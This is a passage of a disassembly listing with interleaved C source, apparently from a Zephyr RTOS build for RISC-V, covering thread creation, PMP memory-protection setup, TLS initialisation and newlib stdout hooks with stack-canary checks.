8000339a:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000339e:	c63a                	sw	a4,12(sp)
800033a0:	4701                	li	a4,0
#ifdef CONFIG_THREAD_LOCAL_STORAGE
	__asm__("mv tp, %0" : : "r" (z_idle_threads[cpu_num].tls));
800033a2:	800097b7          	lui	a5,0x80009
800033a6:	00351413          	slli	s0,a0,0x3
800033aa:	9522                	add	a0,a0,s0
800033ac:	0512                	slli	a0,a0,0x4
800033ae:	19878793          	addi	a5,a5,408 # 80009198 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009199>
800033b2:	97aa                	add	a5,a5,a0
800033b4:	08c7a783          	lw	a5,140(a5)
800033b8:	823e                	mv	tp,a5
#endif
#if defined(CONFIG_RISCV_SOC_INTERRUPT_INIT)
	soc_interrupt_init();
800033ba:	35e5                	jal	800032a2 <soc_interrupt_init>
#endif
#ifdef CONFIG_RISCV_PMP
	z_riscv_pmp_init();
800033bc:	2acd                	jal	800035ae <z_riscv_pmp_init>
#endif
#ifdef CONFIG_SMP
	irq_enable(RISCV_MACHINE_SOFT_IRQ);
#endif
	riscv_cpu_init[cpu_num].fn(riscv_cpu_init[cpu_num].arg);
800033be:	800097b7          	lui	a5,0x80009
800033c2:	02878793          	addi	a5,a5,40 # 80009028 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009029>
800033c6:	97a2                	add	a5,a5,s0
800033c8:	4398                	lw	a4,0(a5)
800033ca:	43c8                	lw	a0,4(a5)
800033cc:	9702                	jalr	a4

800033ce <arch_new_thread>:
#endif

void arch_new_thread(struct k_thread *thread, k_thread_stack_t *stack,
		     char *stack_ptr, k_thread_entry_t entry,
		     void *p1, void *p2, void *p3)
{
800033ce:	1101                	addi	sp,sp,-32
800033d0:	ce06                	sw	ra,28(sp)
800033d2:	8000c5b7          	lui	a1,0x8000c
800033d6:	9505a883          	lw	a7,-1712(a1) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800033da:	c646                	sw	a7,12(sp)
800033dc:	4881                	li	a7,0
#ifdef CONFIG_RISCV_SOC_CONTEXT_SAVE
	const struct soc_esf soc_esf_init = {SOC_ESF_INIT};
#endif

	/* Initial stack frame for thread */
	stack_init = (struct __esf *)Z_STACK_PTR_ALIGN(
800033de:	fb060613          	addi	a2,a2,-80
 * @param ptr Proposed stack pointer address
 * @return Properly aligned stack pointer address
 */
static inline char *z_stack_ptr_align(char *ptr)
{
	return (char *)ROUND_DOWN(ptr, ARCH_STACK_PTR_ALIGN);
800033e2:	9a41                	andi	a2,a2,-16
				Z_STACK_PTR_TO_FRAME(struct __esf, stack_ptr)
				);

	/* Setup the initial stack frame */
	stack_init->a0 = (unsigned long)entry;
800033e4:	d214                	sw	a3,32(a2)
	stack_init->a1 = (unsigned long)p1;
800033e6:	d258                	sw	a4,36(a2)
	stack_init->a2 = (unsigned long)p2;
800033e8:	d61c                	sw	a5,40(a2)
	stack_init->a3 = (unsigned long)p3;
800033ea:	03062623          	sw	a6,44(a2)
	 *    restored following the MSTATUS value set within the thread stack;
	 * 2) the core will jump to z_thread_entry, as the program
	 *    counter will be restored following the MEPC value set within the
	 *    thread stack.
	 */
	stack_init->mstatus = MSTATUS_DEF_RESTORE;
800033ee:	6789                	lui	a5,0x2
800033f0:	88078793          	addi	a5,a5,-1920 # 1880 <CONFIG_ISR_STACK_SIZE+0x880>
800033f4:	c27c                	sw	a5,68(a2)
		/* User thread */
		stack_init->mepc = (unsigned long)k_thread_user_mode_enter;

	} else {
		/* Supervisor thread */
		stack_init->mepc = (unsigned long)z_thread_entry;
800033f6:	800027b7          	lui	a5,0x80002
800033fa:	40e78793          	addi	a5,a5,1038 # 8000240e <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000240f>
800033fe:	c23c                	sw	a5,64(a2)

#ifdef CONFIG_RISCV_SOC_CONTEXT_SAVE
	stack_init->soc_context = soc_esf_init;
#endif

	thread->callee_saved.sp = (unsigned long)stack_init;
80003400:	d910                	sw	a2,48(a0)

	/* where to go when returning from z_riscv_switch() */
	thread->callee_saved.ra = (unsigned long)z_riscv_thread_start;
80003402:	800007b7          	lui	a5,0x80000
80003406:	10878793          	addi	a5,a5,264 # 80000108 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80000109>
8000340a:	d95c                	sw	a5,52(a0)

	/* our switch handle is the thread pointer itself */
	thread->switch_handle = thread;
8000340c:	08a52223          	sw	a0,132(a0)
}
80003410:	4732                	lw	a4,12(sp)
80003412:	9505a783          	lw	a5,-1712(a1)
80003416:	8fb9                	xor	a5,a5,a4
80003418:	4701                	li	a4,0
8000341a:	e781                	bnez	a5,80003422 <arch_new_thread+0x54>
8000341c:	40f2                	lw	ra,28(sp)
8000341e:	6105                	addi	sp,sp,32
80003420:	8082                	ret
80003422:	0d1020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003426 <set_pmp_entry>:
 */
static bool set_pmp_entry(unsigned int *index_p, uint8_t perm,
			  uintptr_t start, size_t size,
			  unsigned long *pmp_addr, unsigned long *pmp_cfg,
			  unsigned int index_limit)
{
80003426:	1101                	addi	sp,sp,-32
80003428:	ce06                	sw	ra,28(sp)
8000342a:	8e2a                	mv	t3,a0
8000342c:	8000c8b7          	lui	a7,0x8000c
80003430:	9508a503          	lw	a0,-1712(a7) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003434:	c62a                	sw	a0,12(sp)
80003436:	4501                	li	a0,0
	uint8_t *pmp_n_cfg = (uint8_t *)pmp_cfg;
	unsigned int index = *index_p;
80003438:	000e2883          	lw	a7,0(t3)
	bool ok = true;

	__ASSERT((start & 0x3) == 0, "misaligned start address");
	__ASSERT((size & 0x3) == 0, "misaligned size");

	if (index >= index_limit) {
8000343c:	0b08fb63          	bgeu	a7,a6,800034f2 <set_pmp_entry+0xcc>
		LOG_ERR("out of PMP slots");
		ok = false;
	} else if ((index == 0 && start == 0) ||
80003440:	02089163          	bnez	a7,80003462 <set_pmp_entry+0x3c>
80003444:	ea1d                	bnez	a2,8000347a <set_pmp_entry+0x54>
		   (index != 0 && pmp_addr[index - 1] == PMP_ADDR(start))) {
		/* We can use TOR using only one additional slot */
		pmp_addr[index] = PMP_ADDR(start + size);
80003446:	96b2                	add	a3,a3,a2
80003448:	00289513          	slli	a0,a7,0x2
8000344c:	972a                	add	a4,a4,a0
8000344e:	8289                	srli	a3,a3,0x2
80003450:	c314                	sw	a3,0(a4)
		pmp_n_cfg[index] = perm | PMP_TOR;
80003452:	97c6                	add	a5,a5,a7
80003454:	0085e593          	ori	a1,a1,8
80003458:	00b78023          	sb	a1,0(a5)
		index += 1;
8000345c:	0885                	addi	a7,a7,1
	bool ok = true;
8000345e:	4505                	li	a0,1
		index += 1;
80003460:	a851                	j	800034f4 <set_pmp_entry+0xce>
		   (index != 0 && pmp_addr[index - 1] == PMP_ADDR(start))) {
80003462:	40000337          	lui	t1,0x40000
80003466:	137d                	addi	t1,t1,-1 # 3fffffff <CONFIG_SYS_CLOCK_HW_CYCLES_PER_SEC+0x3f67697f>
80003468:	9346                	add	t1,t1,a7
8000346a:	030a                	slli	t1,t1,0x2
8000346c:	933a                	add	t1,t1,a4
8000346e:	00032303          	lw	t1,0(t1)
80003472:	00265513          	srli	a0,a2,0x2
80003476:	fca308e3          	beq	t1,a0,80003446 <set_pmp_entry+0x20>
	} else if (((size  & (size - 1)) == 0) /* power of 2 */ &&
8000347a:	fff68513          	addi	a0,a3,-1
8000347e:	00d57333          	and	t1,a0,a3
80003482:	02031a63          	bnez	t1,800034b6 <set_pmp_entry+0x90>
		   ((start & (size - 1)) == 0) /* naturally aligned */) {
80003486:	00c57333          	and	t1,a0,a2
	} else if (((size  & (size - 1)) == 0) /* power of 2 */ &&
8000348a:	02031663          	bnez	t1,800034b6 <set_pmp_entry+0x90>
		pmp_addr[index] = PMP_ADDR_NAPOT(start, size);
8000348e:	8105                	srli	a0,a0,0x1
80003490:	8d51                	or	a0,a0,a2
80003492:	00289613          	slli	a2,a7,0x2
80003496:	9732                	add	a4,a4,a2
80003498:	8109                	srli	a0,a0,0x2
8000349a:	c308                	sw	a0,0(a4)
		pmp_n_cfg[index] = perm | (size == 4 ? PMP_NA4 : PMP_NAPOT);
8000349c:	4711                	li	a4,4
8000349e:	00e68a63          	beq	a3,a4,800034b2 <set_pmp_entry+0x8c>
800034a2:	4761                	li	a4,24
800034a4:	97c6                	add	a5,a5,a7
800034a6:	8f4d                	or	a4,a4,a1
800034a8:	00e78023          	sb	a4,0(a5)
		index += 1;
800034ac:	0885                	addi	a7,a7,1
	bool ok = true;
800034ae:	4505                	li	a0,1
		index += 1;
800034b0:	a091                	j	800034f4 <set_pmp_entry+0xce>
		pmp_n_cfg[index] = perm | (size == 4 ? PMP_NA4 : PMP_NAPOT);
800034b2:	4741                	li	a4,16
800034b4:	bfc5                	j	800034a4 <set_pmp_entry+0x7e>
	} else if (index + 1 >= index_limit) {
800034b6:	00188513          	addi	a0,a7,1
800034ba:	05057a63          	bgeu	a0,a6,8000350e <set_pmp_entry+0xe8>
		LOG_ERR("out of PMP slots");
		ok = false;
	} else {
		pmp_addr[index] = PMP_ADDR(start);
800034be:	00289813          	slli	a6,a7,0x2
800034c2:	983a                	add	a6,a6,a4
800034c4:	00265313          	srli	t1,a2,0x2
800034c8:	00682023          	sw	t1,0(a6) # 10000 <__rom_region_size+0x7000>
		pmp_n_cfg[index] = 0;
800034cc:	01178833          	add	a6,a5,a7
800034d0:	00080023          	sb	zero,0(a6)
		index += 1;
		pmp_addr[index] = PMP_ADDR(start + size);
800034d4:	9636                	add	a2,a2,a3
800034d6:	00251693          	slli	a3,a0,0x2
800034da:	9736                	add	a4,a4,a3
800034dc:	00265693          	srli	a3,a2,0x2
800034e0:	c314                	sw	a3,0(a4)
		pmp_n_cfg[index] = perm | PMP_TOR;
800034e2:	97aa                	add	a5,a5,a0
800034e4:	0085e593          	ori	a1,a1,8
800034e8:	00b78023          	sb	a1,0(a5)
		index += 1;
800034ec:	0889                	addi	a7,a7,2
	bool ok = true;
800034ee:	4505                	li	a0,1
800034f0:	a011                	j	800034f4 <set_pmp_entry+0xce>
		ok = false;
800034f2:	4501                	li	a0,0
	}

	*index_p = index;
800034f4:	011e2023          	sw	a7,0(t3)
	return ok;
}
800034f8:	8000c7b7          	lui	a5,0x8000c
800034fc:	4732                	lw	a4,12(sp)
800034fe:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003502:	8fb9                	xor	a5,a5,a4
80003504:	4701                	li	a4,0
80003506:	e791                	bnez	a5,80003512 <set_pmp_entry+0xec>
80003508:	40f2                	lw	ra,28(sp)
8000350a:	6105                	addi	sp,sp,32
8000350c:	8082                	ret
		ok = false;
8000350e:	4501                	li	a0,0
80003510:	b7d5                	j	800034f4 <set_pmp_entry+0xce>
}
80003512:	7e0020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003516 <write_pmp_entries>:
 */
static void write_pmp_entries(unsigned int start, unsigned int end,
			      bool clear_trailing_entries,
			      unsigned long *pmp_addr, unsigned long *pmp_cfg,
			      unsigned int index_limit)
{
80003516:	7179                	addi	sp,sp,-48
80003518:	d606                	sw	ra,44(sp)
8000351a:	d422                	sw	s0,40(sp)
8000351c:	d226                	sw	s1,36(sp)
8000351e:	d04a                	sw	s2,32(sp)
80003520:	ce4e                	sw	s3,28(sp)
80003522:	cc52                	sw	s4,24(sp)
80003524:	84aa                	mv	s1,a0
80003526:	892e                	mv	s2,a1
80003528:	89b2                	mv	s3,a2
8000352a:	8a36                	mv	s4,a3
8000352c:	843a                	mv	s0,a4
8000352e:	8000c737          	lui	a4,0x8000c
80003532:	95072683          	lw	a3,-1712(a4) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003536:	c636                	sw	a3,12(sp)
80003538:	4681                	li	a3,0
	__ASSERT(start < end && end <= index_limit &&
		 index_limit <= CONFIG_PMP_SLOTS,
		 "bad PMP range (start=%u end=%u)", start, end);

	/* Be extra paranoid in case assertions are disabled */
	if (start >= end || end > index_limit) {
8000353a:	00b57463          	bgeu	a0,a1,80003542 <write_pmp_entries+0x2c>
8000353e:	00b7f663          	bgeu	a5,a1,8000354a <write_pmp_entries+0x34>
	return a0;
}

static inline uintptr_t arch_syscall_invoke1(uintptr_t arg1, uintptr_t call_id)
{
	register unsigned long a0 __asm__ ("a0") = arg1;
80003542:	4511                	li	a0,4
	register unsigned long t0 __asm__ ("t0") = call_id;
80003544:	4281                	li	t0,0

	__asm__ volatile ("ecall"
80003546:	00000073          	ecall
		k_panic();
	}

	if (clear_trailing_entries) {
8000354a:	04099e63          	bnez	s3,800035a6 <write_pmp_entries+0x90>
	 * The QEMU fix is here with more details about this bug:
	 * https://lists.gnu.org/archive/html/qemu-devel/2022-06/msg02800.html
	 */
	static const unsigned long pmp_zero[CONFIG_PMP_SLOTS] = { 0, };

	z_riscv_write_pmp_entries(start, CONFIG_PMP_SLOTS, false,
8000354e:	800086b7          	lui	a3,0x80008
80003552:	fe468713          	addi	a4,a3,-28 # 80007fe4 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007fe5>
80003556:	fe468693          	addi	a3,a3,-28
8000355a:	4601                	li	a2,0
8000355c:	45c1                	li	a1,16
8000355e:	8526                	mv	a0,s1
80003560:	c34fd0ef          	jal	ra,80000994 <z_riscv_write_pmp_entries>
				  pmp_zero, pmp_zero);
#endif

	z_riscv_write_pmp_entries(start, end, clear_trailing_entries,
80003564:	8722                	mv	a4,s0
80003566:	86d2                	mv	a3,s4
80003568:	864e                	mv	a2,s3
8000356a:	85ca                	mv	a1,s2
8000356c:	8526                	mv	a0,s1
8000356e:	c26fd0ef          	jal	ra,80000994 <z_riscv_write_pmp_entries>
				  pmp_addr, pmp_cfg);
}
80003572:	8000c7b7          	lui	a5,0x8000c
80003576:	4732                	lw	a4,12(sp)
80003578:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000357c:	8fb9                	xor	a5,a5,a4
8000357e:	4701                	li	a4,0
80003580:	e78d                	bnez	a5,800035aa <write_pmp_entries+0x94>
80003582:	50b2                	lw	ra,44(sp)
80003584:	5422                	lw	s0,40(sp)
80003586:	5492                	lw	s1,36(sp)
80003588:	5902                	lw	s2,32(sp)
8000358a:	49f2                	lw	s3,28(sp)
8000358c:	4a62                	lw	s4,24(sp)
8000358e:	6145                	addi	sp,sp,48
80003590:	8082                	ret
			pmp_n_cfg[index] = 0;
80003592:	00f40833          	add	a6,s0,a5
80003596:	00080023          	sb	zero,0(a6)
		for (index = end; index % PMPCFG_STRIDE != 0; index++) {
8000359a:	0785                	addi	a5,a5,1
8000359c:	0037f813          	andi	a6,a5,3
800035a0:	fe0819e3          	bnez	a6,80003592 <write_pmp_entries+0x7c>
800035a4:	b76d                	j	8000354e <write_pmp_entries+0x38>
800035a6:	87ca                	mv	a5,s2
800035a8:	bfd5                	j	8000359c <write_pmp_entries+0x86>
}
800035aa:	748020ef          	jal	ra,80005cf2 <_StackCheckHandler>

800035ae <z_riscv_pmp_init>:

/**
 * @Brief Initialize the PMP with global entries on each CPU
 */
void z_riscv_pmp_init(void)
{
800035ae:	7179                	addi	sp,sp,-48
800035b0:	d606                	sw	ra,44(sp)
800035b2:	d422                	sw	s0,40(sp)
800035b4:	8000c437          	lui	s0,0x8000c
800035b8:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800035bc:	ce3e                	sw	a5,28(sp)
800035be:	4781                	li	a5,0
	unsigned long pmp_addr[4];
	unsigned long pmp_cfg[1];
	unsigned int index = 0;
800035c0:	c202                	sw	zero,4(sp)

	/* The read-only area is always there for every mode */
	set_pmp_entry(&index, PMP_R | PMP_X | PMP_L,
800035c2:	4811                	li	a6,4
800035c4:	003c                	addi	a5,sp,8
800035c6:	0078                	addi	a4,sp,12
800035c8:	66a5                	lui	a3,0x9
800035ca:	00068693          	mv	a3,a3
800035ce:	80000637          	lui	a2,0x80000
800035d2:	00060613          	mv	a2,a2
800035d6:	08500593          	li	a1,133
800035da:	0048                	addi	a0,sp,4
800035dc:	35a9                	jal	80003426 <set_pmp_entry>
		      (uintptr_t)z_interrupt_stacks[_current_cpu->id],
		      Z_RISCV_STACK_GUARD_SIZE,
		      pmp_addr, pmp_cfg, ARRAY_SIZE(pmp_addr));
#endif

	write_pmp_entries(0, index, true, pmp_addr, pmp_cfg, ARRAY_SIZE(pmp_addr));
800035de:	4791                	li	a5,4
800035e0:	0038                	addi	a4,sp,8
800035e2:	0074                	addi	a3,sp,12
800035e4:	4605                	li	a2,1
800035e6:	4592                	lw	a1,4(sp)
800035e8:	4501                	li	a0,0
800035ea:	3735                	jal	80003516 <write_pmp_entries>
		__ASSERT(global_pmp_cfg[0] == pmp_cfg[0], "");
		__ASSERT(global_pmp_last_addr == pmp_addr[index - 1], "");
	}
#endif

	global_pmp_cfg[0] = pmp_cfg[0];
800035ec:	4722                	lw	a4,8(sp)
800035ee:	800097b7          	lui	a5,0x80009
800035f2:	02e7ac23          	sw	a4,56(a5) # 80009038 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009039>
	global_pmp_last_addr = pmp_addr[index - 1];
800035f6:	4712                	lw	a4,4(sp)
800035f8:	fff70793          	addi	a5,a4,-1
800035fc:	078a                	slli	a5,a5,0x2
800035fe:	02078793          	addi	a5,a5,32
80003602:	978a                	add	a5,a5,sp
80003604:	fec7a683          	lw	a3,-20(a5)
80003608:	800097b7          	lui	a5,0x80009
8000360c:	02d7aa23          	sw	a3,52(a5) # 80009034 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009035>
	global_pmp_end_index = index;
80003610:	800097b7          	lui	a5,0x80009
80003614:	02e7a823          	sw	a4,48(a5) # 80009030 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009031>

	if (PMP_DEBUG_DUMP) {
		dump_pmp_regs("initial register dump");
	}
}
80003618:	4772                	lw	a4,28(sp)
8000361a:	95042783          	lw	a5,-1712(s0)
8000361e:	8fb9                	xor	a5,a5,a4
80003620:	4701                	li	a4,0
80003622:	e789                	bnez	a5,8000362c <z_riscv_pmp_init+0x7e>
80003624:	50b2                	lw	ra,44(sp)
80003626:	5422                	lw	s0,40(sp)
80003628:	6145                	addi	sp,sp,48
8000362a:	8082                	ret
8000362c:	6c6020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003630 <z_tls_copy>:
 * of TLS bss size after the data section.
 *
 * @param dest Pointer to destination
 */
static inline void z_tls_copy(char *dest)
{
80003630:	1101                	addi	sp,sp,-32
80003632:	ce06                	sw	ra,28(sp)
80003634:	cc22                	sw	s0,24(sp)
80003636:	ca26                	sw	s1,20(sp)
80003638:	c84a                	sw	s2,16(sp)
8000363a:	842a                	mv	s0,a0
8000363c:	8000c4b7          	lui	s1,0x8000c
80003640:	9504a783          	lw	a5,-1712(s1) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003644:	c63e                	sw	a5,12(sp)
80003646:	4781                	li	a5,0
	size_t tdata_size = (size_t)__tdata_size;
80003648:	00000913          	li	s2,0
8000364c:	00000613          	li	a2,0
80003650:	800075b7          	lui	a1,0x80007
80003654:	11a58593          	addi	a1,a1,282 # 8000711a <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000711b>
80003658:	996fd0ef          	jal	ra,800007ee <memcpy>

	/* Copy initialized data (tdata) */
	memcpy(dest, __tdata_start, tdata_size);

	/* Clear BSS data (tbss) */
	dest += ROUND_UP(tdata_size, __tdata_align);
8000365c:	00100793          	li	a5,1
80003660:	fff78713          	addi	a4,a5,-1
80003664:	974a                	add	a4,a4,s2
80003666:	40f007b3          	neg	a5,a5
8000366a:	8ff9                	and	a5,a5,a4
__ssp_bos_icheck3(memset, void *, int)
8000366c:	00400613          	li	a2,4
80003670:	4581                	li	a1,0
80003672:	00f40533          	add	a0,s0,a5
80003676:	98efd0ef          	jal	ra,80000804 <memset>
	memset(dest, 0, tbss_size);
}
8000367a:	4732                	lw	a4,12(sp)
8000367c:	9504a783          	lw	a5,-1712(s1)
80003680:	8fb9                	xor	a5,a5,a4
80003682:	4701                	li	a4,0
80003684:	e799                	bnez	a5,80003692 <z_tls_copy+0x62>
80003686:	40f2                	lw	ra,28(sp)
80003688:	4462                	lw	s0,24(sp)
8000368a:	44d2                	lw	s1,20(sp)
8000368c:	4942                	lw	s2,16(sp)
8000368e:	6105                	addi	sp,sp,32
80003690:	8082                	ret
80003692:	660020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003696 <arch_tls_stack_setup>:
#include <kernel_tls.h>
#include <zephyr/app_memory/app_memdomain.h>
#include <zephyr/sys/util.h>

size_t arch_tls_stack_setup(struct k_thread *new_thread, char *stack_ptr)
{
80003696:	7179                	addi	sp,sp,-48
80003698:	d606                	sw	ra,44(sp)
8000369a:	d422                	sw	s0,40(sp)
8000369c:	d226                	sw	s1,36(sp)
8000369e:	d04a                	sw	s2,32(sp)
800036a0:	ce4e                	sw	s3,28(sp)
800036a2:	84aa                	mv	s1,a0
800036a4:	8000c937          	lui	s2,0x8000c
800036a8:	95092783          	lw	a5,-1712(s2) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800036ac:	c63e                	sw	a5,12(sp)
800036ae:	4781                	li	a5,0
	size_t tdata_size = ROUND_UP(__tdata_size, __tdata_align);
800036b0:	00100793          	li	a5,1
800036b4:	00000413          	li	s0,0
800036b8:	943e                	add	s0,s0,a5
800036ba:	147d                	addi	s0,s0,-1
800036bc:	40f007b3          	neg	a5,a5
800036c0:	8c7d                	and	s0,s0,a5
	size_t tbss_size = ROUND_UP(__tbss_size, __tbss_align);
800036c2:	00400713          	li	a4,4
800036c6:	00400793          	li	a5,4
800036ca:	97ba                	add	a5,a5,a4
800036cc:	17fd                	addi	a5,a5,-1
800036ce:	40e00733          	neg	a4,a4
800036d2:	8ff9                	and	a5,a5,a4
	return tdata_size + tbss_size;
800036d4:	943e                	add	s0,s0,a5

	/*
	 * Since we are populating things backwards,
	 * setup the TLS data/bss area first.
	 */
	stack_ptr -= z_tls_data_size();
800036d6:	408589b3          	sub	s3,a1,s0
	z_tls_copy(stack_ptr);
800036da:	854e                	mv	a0,s3
800036dc:	3f91                	jal	80003630 <z_tls_copy>

	/*
	 * Set thread TLS pointer which is used in
	 * context switch to point to TLS area.
	 */
	new_thread->tls = POINTER_TO_UINT(stack_ptr);
800036de:	0934a623          	sw	s3,140(s1)

	return z_tls_data_size();
}
800036e2:	4732                	lw	a4,12(sp)
800036e4:	95092783          	lw	a5,-1712(s2)
800036e8:	8fb9                	xor	a5,a5,a4
800036ea:	4701                	li	a4,0
800036ec:	eb89                	bnez	a5,800036fe <arch_tls_stack_setup+0x68>
800036ee:	8522                	mv	a0,s0
800036f0:	50b2                	lw	ra,44(sp)
800036f2:	5422                	lw	s0,40(sp)
800036f4:	5492                	lw	s1,36(sp)
800036f6:	5902                	lw	s2,32(sp)
800036f8:	49f2                	lw	s3,28(sp)
800036fa:	6145                	addi	sp,sp,48
800036fc:	8082                	ret
800036fe:	5f4020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003702 <malloc_prepare>:
					 CONFIG_SRAM_BASE_ADDRESS))
	#endif /* CONFIG_XTENSA */
#endif

static int malloc_prepare(const struct device *unused)
{
80003702:	1101                	addi	sp,sp,-32
80003704:	ce06                	sw	ra,28(sp)
80003706:	8000c7b7          	lui	a5,0x8000c
8000370a:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000370e:	c63a                	sw	a4,12(sp)
80003710:	4701                	li	a4,0
		 "memory space available for newlib heap is less than the "
		 "minimum required size specified by "
		 "CONFIG_NEWLIB_LIBC_MIN_REQUIRED_HEAP_SIZE");

	return 0;
}
80003712:	4732                	lw	a4,12(sp)
80003714:	9507a783          	lw	a5,-1712(a5)
80003718:	8fb9                	xor	a5,a5,a4
8000371a:	4701                	li	a4,0
8000371c:	e789                	bnez	a5,80003726 <malloc_prepare+0x24>
8000371e:	4501                	li	a0,0
80003720:	40f2                	lw	ra,28(sp)
80003722:	6105                	addi	sp,sp,32
80003724:	8082                	ret
80003726:	5cc020ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000372a <_stdout_hook_default>:

/* Current offset from HEAP_BASE of unused memory */
LIBC_BSS static size_t heap_sz;

static int _stdout_hook_default(int c)
{
8000372a:	1101                	addi	sp,sp,-32
8000372c:	ce06                	sw	ra,28(sp)
8000372e:	8000c7b7          	lui	a5,0x8000c
80003732:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003736:	c63a                	sw	a4,12(sp)
80003738:	4701                	li	a4,0
	(void)(c);  /* Prevent warning about unused argument */

	return EOF;
}
8000373a:	4732                	lw	a4,12(sp)
8000373c:	9507a783          	lw	a5,-1712(a5)
80003740:	8fb9                	xor	a5,a5,a4
80003742:	4701                	li	a4,0
80003744:	e789                	bnez	a5,8000374e <_stdout_hook_default+0x24>
80003746:	557d                	li	a0,-1
80003748:	40f2                	lw	ra,28(sp)
8000374a:	6105                	addi	sp,sp,32
8000374c:	8082                	ret
8000374e:	5a4020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003752 <__stdout_hook_install>:

static int (*_stdout_hook)(int) = _stdout_hook_default;

void __stdout_hook_install(int (*hook)(int))
{
80003752:	1101                	addi	sp,sp,-32
80003754:	ce06                	sw	ra,28(sp)
80003756:	8000c7b7          	lui	a5,0x8000c
8000375a:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000375e:	c63a                	sw	a4,12(sp)
80003760:	4701                	li	a4,0
	_stdout_hook = hook;
80003762:	82a1a023          	sw	a0,-2016(gp) # 8000c008 <_stdout_hook>
}
80003766:	4732                	lw	a4,12(sp)
80003768:	9507a783          	lw	a5,-1712(a5)
8000376c:	8fb9                	xor	a5,a5,a4
8000376e:	4701                	li	a4,0
80003770:	e781                	bnez	a5,80003778 <__stdout_hook_install+0x26>
80003772:	40f2                	lw	ra,28(sp)
80003774:	6105                	addi	sp,sp,32
80003776:	8082                	ret
80003778:	57a020ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000377c <z_impl_zephyr_write_stdout>:
}
#include <syscalls/zephyr_read_stdin_mrsh.c>
#endif

int z_impl_zephyr_write_stdout(const void *buffer, int nbytes)
{
8000377c:	7179                	addi	sp,sp,-48
8000377e:	d606                	sw	ra,44(sp)
80003780:	d422                	sw	s0,40(sp)
80003782:	d226                	sw	s1,36(sp)
80003784:	d04a                	sw	s2,32(sp)
80003786:	ce4e                	sw	s3,28(sp)
80003788:	89aa                	mv	s3,a0
8000378a:	892e                	mv	s2,a1
8000378c:	8000c7b7          	lui	a5,0x8000c
80003790:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003794:	c63a                	sw	a4,12(sp)
80003796:	4701                	li	a4,0
	const char *buf = buffer;
	int i;

	for (i = 0; i < nbytes; i++) {
80003798:	4401                	li	s0,0
8000379a:	a039                	j	800037a8 <z_impl_zephyr_write_stdout+0x2c>
		if (*(buf + i) == '\n') {
			_stdout_hook('\r');
		}
		_stdout_hook(*(buf + i));
8000379c:	8201a783          	lw	a5,-2016(gp) # 8000c008 <_stdout_hook>
800037a0:	0004c503          	lbu	a0,0(s1)
800037a4:	9782                	jalr	a5
	for (i = 0; i < nbytes; i++) {
800037a6:	0405                	addi	s0,s0,1
800037a8:	01245e63          	bge	s0,s2,800037c4 <z_impl_zephyr_write_stdout+0x48>
		if (*(buf + i) == '\n') {
800037ac:	008984b3          	add	s1,s3,s0
800037b0:	0004c703          	lbu	a4,0(s1)
800037b4:	47a9                	li	a5,10
800037b6:	fef713e3          	bne	a4,a5,8000379c <z_impl_zephyr_write_stdout+0x20>
			_stdout_hook('\r');
800037ba:	8201a783          	lw	a5,-2016(gp) # 8000c008 <_stdout_hook>
800037be:	4535                	li	a0,13
800037c0:	9782                	jalr	a5
800037c2:	bfe9                	j	8000379c <z_impl_zephyr_write_stdout+0x20>
	}
	return nbytes;
}
800037c4:	8000c7b7          	lui	a5,0x8000c
800037c8:	4732                	lw	a4,12(sp)
800037ca:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800037ce:	8fb9                	xor	a5,a5,a4
800037d0:	4701                	li	a4,0
800037d2:	eb89                	bnez	a5,800037e4 <z_impl_zephyr_write_stdout+0x68>
800037d4:	854a                	mv	a0,s2
800037d6:	50b2                	lw	ra,44(sp)
800037d8:	5422                	lw	s0,40(sp)
800037da:	5492                	lw	s1,36(sp)
800037dc:	5902                	lw	s2,32(sp)
800037de:	49f2                	lw	s3,28(sp)
800037e0:	6145                	addi	sp,sp,48
800037e2:	8082                	ret
800037e4:	50e020ef          	jal	ra,80005cf2 <_StackCheckHandler>

800037e8 <_write>:
	return zephyr_read_stdin(buf, nbytes);
}
__weak FUNC_ALIAS(_read, read, int);

int _write(int fd, const void *buf, int nbytes)
{
800037e8:	1101                	addi	sp,sp,-32
